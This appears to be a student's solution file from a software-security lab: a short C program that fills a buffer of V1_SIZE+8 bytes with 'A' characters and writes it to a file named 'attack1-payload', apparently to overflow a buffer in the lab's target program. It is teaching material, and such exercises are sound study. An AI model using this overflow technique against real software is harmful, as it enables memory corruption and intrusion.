#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
	int buf_size=V1_SIZE+8;	
	char buffer[buf_size];
	memset(buffer,'A',buf_size);
    write_to_file( "attack1-payload", buffer , buf_size , FILE_CLEAR );
    exit(0);
}
